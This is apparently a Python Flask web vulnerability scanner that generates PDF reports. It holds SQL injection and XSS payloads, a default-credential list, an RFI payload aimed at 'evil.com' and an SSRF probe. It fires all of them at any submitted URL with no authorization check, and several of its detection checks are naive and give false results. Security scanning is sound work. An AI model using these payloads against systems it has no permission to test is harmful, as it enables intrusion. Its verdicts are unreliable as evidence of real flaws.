from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import requests
from urllib.parse import urljoin, urlparse
import re
import socket
import ssl
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib import colors
from io import BytesIO
from datetime import datetime

app = Flask(__name__, template_folder='.', static_folder='static')
CORS(app)

@app.errorhandler(Exception)
def handle_exception(e):
    return jsonify({"error": str(e)}), 500

@app.errorhandler(400)
def handle_bad_request(e):
    return jsonify({"error": "Bad request"}), 400

@app.errorhandler(404)
def handle_not_found(e):
    # Return JSON for missing endpoints so frontend fetches receive JSON errors
    return jsonify({"error": "404 Not Found", "message": str(e)}), 404

# Combined vulnerability checks
SQL_PAYLOADS = ['1=1', "' OR '1'='1", "' AND 1=0--"]
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">', '<svg onload=alert(1)>']
COMMON_CREDENTIALS = [('admin', 'admin'), ('root', 'root'), ('user', 'password'), ('guest', 'guest'), ('test', 'test123')]
WORDLIST = ["admin", "backup", "config", "login", "test", "users", "uploads"]

# Vulnerability explanations for PDF reports
VULNERABILITY_EXPLANATIONS = {
    'sql_injection': 'SQL Injection is a code injection technique where an attacker inserts malicious SQL statements. This can compromise database integrity, steal sensitive data, or lead to unauthorized access.',
    'xss': 'Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages. It can steal user sessions, modify page content, or redirect users to malicious sites.',
    'broken_auth': 'Broken Authentication occurs when applications improperly manage user sessions and credentials, allowing attackers to compromise passwords, hijack sessions, or assume other user identities.',
    'access_control': 'Broken Access Control allows users to act outside their intended permissions. This can lead to unauthorized information disclosure, modification, or destruction of data.',
    'csrf': 'Cross-Site Request Forgery (CSRF) tricks authenticated users into performing unwanted actions on their behalf without their knowledge. This can result in unauthorized transactions or data changes.',
    'security_misc': 'Security Misconfiguration includes missing security patches, unnecessary services enabled, default credentials, or improperly configured security headers.',
    'sensitive_data': 'Sensitive Data Exposure occurs when applications fail to protect sensitive data such as credentials, financial data, or personal information during transmission or storage.',
    'ssrf': 'Server-Side Request Forgery (SSRF) is a vulnerability where an attacker induces a server to make requests to unintended locations, potentially accessing internal resources or services.',
    'crypto_failure': 'Cryptographic Failures refer to failures in data protection mechanisms, such as using weak algorithms, improper key management, or transmitting data in plaintext.',
    'rfi': 'Remote File Inclusion (RFI) allows attackers to include remote files on a web server, leading to arbitrary code execution or information disclosure.',
    'server_info': 'Server information exposure reveals details about the web server, which can help attackers identify known vulnerabilities specific to that server version.',
    'http_methods': 'Unrestricted HTTP Methods can allow attackers to perform unauthorized operations such as PUT, DELETE, or TRACE, compromising application security.'
}

def initialize_results():
    return []

def get_explanation(vulnerability_type):
    """Get brief explanation for a vulnerability type"""
    return VULNERABILITY_EXPLANATIONS.get(vulnerability_type, 'Unknown vulnerability detected during scan.')

def generate_pdf_report(target_url, results):
    """Generate a PDF report with scan results and explanations"""
    pdf_buffer = BytesIO()
    doc = SimpleDocTemplate(pdf_buffer, pagesize=letter, topMargin=0.5*inch, bottomMargin=0.5*inch)
    
    # Container for PDF elements
    elements = []
    styles = getSampleStyleSheet()
    
    # Custom styles
    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=20,
        textColor=colors.HexColor('#4F46E5'),
        spaceAfter=12,
        alignment=1  # center
    )
    
    heading_style = ParagraphStyle(
        'CustomHeading',
        parent=styles['Heading2'],
        fontSize=14,
        textColor=colors.HexColor('#1F2937'),
        spaceAfter=8,
        spaceBefore=8
    )
    
    body_style = ParagraphStyle(
        'CustomBody',
        parent=styles['Normal'],
        fontSize=10,
        textColor=colors.HexColor('#4B5563'),
        spaceAfter=6
    )
    
    # Title
    elements.append(Paragraph("Web Vulnerability Scan Report", title_style))
    elements.append(Spacer(1, 0.2*inch))
    
    # Report metadata
    metadata = [
        ['Target URL:', target_url],
        ['Scan Date:', datetime.now().strftime("%Y-%m-%d %H:%M:%S")],
        ['Total Issues Found:', str(len(results))]
    ]
    metadata_table = Table(metadata, colWidths=[2*inch, 4*inch])
    metadata_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#F3F4F6')),
        ('TEXTCOLOR', (0, 0), (-1, -1), colors.HexColor('#1F2937')),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, -1), 10),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
        ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#E5E7EB'))
    ]))
    elements.append(metadata_table)
    elements.append(Spacer(1, 0.3*inch))
    
    # Scan Results
    elements.append(Paragraph("Scan Results", heading_style))
    
    if results:
        for idx, result in enumerate(results, 1):
            # Result text
            elements.append(Paragraph(f"<b>{idx}. {result}</b>", body_style))
            
            # Add explanation based on result content
            explanation = extract_and_explain_result(result)
            elements.append(Paragraph(explanation, body_style))
            elements.append(Spacer(1, 0.15*inch))
            
            # Add page break every 5 results to avoid crowding
            if idx % 5 == 0 and idx < len(results):
                elements.append(PageBreak())
    else:
        elements.append(Paragraph("No vulnerabilities detected during scan.", body_style))
    
    elements.append(Spacer(1, 0.2*inch))
    
    # Footer
    elements.append(Paragraph(
        "<font size=8 color='#999999'>© 2024 WebSecScanner - Security Assessment Tool</font>",
        ParagraphStyle('Footer', parent=styles['Normal'], alignment=1)
    ))
    
    # Build PDF
    doc.build(elements)
    pdf_buffer.seek(0)
    return pdf_buffer

def extract_and_explain_result(result_text):
    """Extract vulnerability type from result and provide explanation"""
    result_lower = result_text.lower()
    
    if 'sql injection' in result_lower or 'sql' in result_lower:
        explanation = get_explanation('sql_injection')
    elif 'xss' in result_lower or 'cross-site' in result_lower or 'cross site' in result_lower:
        explanation = get_explanation('xss')
    elif 'authentication' in result_lower or 'weak auth' in result_lower:
        explanation = get_explanation('broken_auth')
    elif 'access control' in result_lower:
        explanation = get_explanation('access_control')
    elif 'csrf' in result_lower:
        explanation = get_explanation('csrf')
    elif '.env' in result_lower or 'security misconfiguration' in result_lower or 'phpinfo' in result_lower:
        explanation = get_explanation('security_misc')
    elif 'sensitive data' in result_lower or 'http' in result_lower and 'https' not in result_lower:
        explanation = get_explanation('sensitive_data')
    elif 'ssrf' in result_lower:
        explanation = get_explanation('ssrf')
    elif 'cryptographic' in result_lower or 'plaintext' in result_lower:
        explanation = get_explanation('crypto_failure')
    elif 'rfi' in result_lower:
        explanation = get_explanation('rfi')
    elif 'server' in result_lower:
        explanation = get_explanation('server_info')
    elif 'http method' in result_lower or 'allowed' in result_lower:
        explanation = get_explanation('http_methods')
    else:
        explanation = 'This item was detected during the security scan. Please review and assess the severity.'
    
    return f"<i><font color='#666666'>{explanation}</font></i>"

def perform_scan(target_url):
    results = initialize_results()
    nikto_checks(target_url, results)
    check_sql_injection_and_xss(target_url, results)
    check_broken_authentication(target_url, results)
    check_broken_access_control(target_url, results)
    check_csrf(target_url, results)
    check_security_misconfiguration(target_url, results)
    check_sensitive_data_exposure(target_url, results)
    check_ssrf(target_url, results)
    check_cryptographic_failures(target_url, results)
    check_rfi(target_url, results)
    return results

def check_sql_injection_and_xss(url, results):
    for payload in SQL_PAYLOADS:
        test_url = urljoin(url, f"?input={payload}")
        try:
            response = requests.get(test_url, timeout=5)
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                results.append(f"[+] SQL Injection detected with payload: {payload}")
        except requests.HTTPError as e:
            results.append(f"[-] Error checking SQL Injection: {str(e)}")

    for payload in XSS_PAYLOADS:
        test_url = urljoin(url, f"?input={payload}")
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                results.append(f"[+] XSS vulnerability detected with payload: {payload}")
        except requests.HTTPError as e:
            results.append(f"[-] Error checking XSS: {str(e)}")

def check_broken_authentication(url, results):
    session = requests.Session()
    for username, password in COMMON_CREDENTIALS:
        login_data = {'username': username, 'password': password}
        try:
            response = session.post(url, data=login_data, timeout=5)
            if "Welcome" in response.text or "Dashboard" in response.text:
                results.append(f"[+] Weak authentication: {username}:{password} allows login.")
            if "PHPSESSID" in session.cookies.get_dict():
                results.append(f"[-] Session ID is predictable: {session.cookies['PHPSESSID']}")
            else:
                results.append("[+] No predictable session ID found.")

            # Check for multiple sessions
            response2 = requests.post(url, data=login_data, timeout=5)
            if response2.status_code == 200:
                results.append("[+] Multiple sessions allowed with same credentials.")
        except requests.RequestException as e:
            results.append(f"[-] Error checking authentication: {str(e)}")

def check_broken_access_control(url, results):
    restricted_page = urljoin(url, "/admin")
    try:
        response = requests.get(restricted_page, timeout=5)
        if response.status_code == 200:
            results.append("[+] Broken Access Control: Access to restricted page allowed.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking Broken Access Control: {str(e)}")

def check_csrf(url, results):
    csrf_payload = {'username': 'test', 'password': 'test'}
    try:
        response = requests.post(urljoin(url, "/login"), data=csrf_payload, timeout=5)
        if "Invalid" not in response.text:
            results.append("[+] CSRF vulnerability detected.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking CSRF: {str(e)}")

def check_security_misconfiguration(url, results):
    try:
        response = requests.get(urljoin(url, "/.env"), timeout=5)
        if response.status_code == 200:
            results.append("[+] Security Misconfiguration detected: Exposed .env file.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking Security Misconfiguration: {str(e)}")

def check_sensitive_data_exposure(url, results):
    if url.startswith("http://"):
        results.append("[+] Sensitive Data Exposure detected: HTTP used instead of HTTPS.")

def check_ssrf(url, results):
    ssrf_payload = "http://127.0.0.1:8080"
    try:
        response = requests.get(urljoin(url, f"?target={ssrf_payload}"), timeout=5)
        if response.status_code == 200:
            results.append("[+] SSRF vulnerability detected.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking SSRF: {str(e)}")

def check_cryptographic_failures(url, results):
    try:
        response = requests.get(urljoin(url, "/profile"), timeout=5)
        if "password" in response.text and "plaintext" in response.text:
            results.append("[+] Cryptographic Failure detected: Sensitive data exposed in plaintext.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking Cryptographic Failures: {str(e)}")

def check_rfi(url, results):
    rfi_payload = "http://evil.com/malicious_file"
    try:
        response = requests.get(urljoin(url, f"?file={rfi_payload}"), timeout=5)
        if response.status_code == 200:
            results.append("[+] RFI vulnerability detected.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking RFI: {str(e)}")

def nikto_checks(target_url, results):
    try:
        response = requests.get(target_url)
        results.append(f"Server: {response.headers.get('Server')}")

        # Common file checks
        common_files = ["/robots.txt", "/admin/", "/config.php", "/.git/config"]
        for file in common_files:
            file_url = urljoin(target_url, file)
            file_response = requests.get(file_url)
            if file_response.status_code == 200:
                results.append(f"Found: {file}")
            elif file_response.status_code == 403:
                results.append(f"Forbidden: {file}")
            elif file_response.status_code == 404:
                results.append(f"Not Found: {file}")

        # Basic vulnerability pattern check
        if re.search(r"phpinfo\(\)", response.text, re.IGNORECASE):
            results.append("Potential vulnerability: phpinfo() found.")

        # HTTP method check
        options_response = requests.options(target_url)
        allowed_methods = options_response.headers.get("Allow")
        results.append(f"Allowed HTTP methods: {allowed_methods}")

        # SSL/TLS check
        try:
            context = ssl.create_default_context()
            with context.wrap_socket(socket.socket(), server_hostname=urlparse(target_url).netloc) as ssock:
                cert = ssock.getpeercert()
                results.append(f"Certificate: {cert}")
        except Exception as e:
            results.append(f"SSL/TLS error: {e}")

        # Directory brute force (using combined wordlist)
        for word in WORDLIST:
            test_url = urljoin(target_url, word)
            test_response = requests.get(test_url)
            if test_response.status_code == 200:
                results.append(f"Directory found: {test_url}")

    except requests.RequestException as e:
        results.append(f"Error: {e}")

@app.route("/", methods=["GET", "POST"])
def index():
    results = initialize_results()  # Initialize results here
    if request.method == "POST":
        target_url = request.form["target_url"]
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
        nikto_checks(target_url, results)
        check_sql_injection_and_xss(target_url, results)
        check_broken_authentication(target_url, results)
        check_broken_access_control(target_url, results)
        check_csrf(target_url, results)
        check_security_misconfiguration(target_url, results)
        check_sensitive_data_exposure(target_url, results)
        check_ssrf(target_url, results)
        check_cryptographic_failures(target_url, results)
        check_rfi(target_url, results)
    return render_template("index.html", results=results)

@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/scanner")
@app.route("/scanner/")
def scanner():
    return render_template("scanner.html")

@app.route("/scan", methods=["POST"])
def scan():
    try:
        data = request.get_json()
        target_url = data.get("url")
        if not target_url:
            return jsonify({"error": "No URL provided"}), 400
        parsed = urlparse(target_url)
        if not parsed.scheme or not parsed.netloc:
            return jsonify({"error": "Invalid URL. Please provide a full URL starting with http:// or https://"}), 400
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
        results = perform_scan(target_url)
        return jsonify({"results": results, "url": target_url})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/generate-pdf", methods=["POST"])
def generate_pdf():
    """Generate and download PDF report"""
    try:
        data = request.get_json()
        target_url = data.get("url")
        results = data.get("results", [])
        
        if not target_url:
            return jsonify({"error": "No URL provided"}), 400
        
        # Generate PDF
        pdf_buffer = generate_pdf_report(target_url, results)
        
        # Create filename with timestamp
        filename = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        
        return send_file(
            pdf_buffer,
            mimetype='application/pdf',
            as_attachment=True,
            download_name=filename
        )
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True)